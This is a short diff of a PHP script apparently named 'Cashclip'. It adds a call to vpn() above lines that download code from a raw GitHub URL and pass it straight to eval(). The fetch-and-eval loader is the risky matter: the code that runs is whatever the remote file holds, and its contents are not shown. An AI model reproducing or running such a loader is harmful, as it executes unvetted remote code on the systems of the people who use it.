@@ -2,7 +2,7 @@
 error_reporting(E_ALL);
 
 const script = "Cashclip";
-
+vpn();
 $function = file_get_contents("https://raw.githubusercontent.com/Bagusivo1999/fullscript/refs/heads/main/curlku");
 eval($function);
 
